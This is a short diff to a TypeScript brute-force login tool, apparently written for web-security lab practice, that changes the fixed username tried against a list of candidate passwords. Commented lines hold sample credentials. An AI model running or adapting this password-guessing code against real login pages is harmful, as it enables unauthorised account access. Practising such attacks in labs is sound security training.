@@ -51,7 +51,7 @@ export const bruteForceAttack = async (targetURL: string, payloadFile?: string) 
 
 	for (let i = 0; i < payloadUsernames.length; i++) {
 		// const data: string = `username=${payloadUsernames[i]}&password=pass`;
-		const data: string = `username=as400&password=${payloadPasswords[i]}`;
+		const data: string = `username=apps&password=${payloadPasswords[i]}`;
 		// const data: string = 'username=wiener&password=peter';
 		config = {
 			headers: {
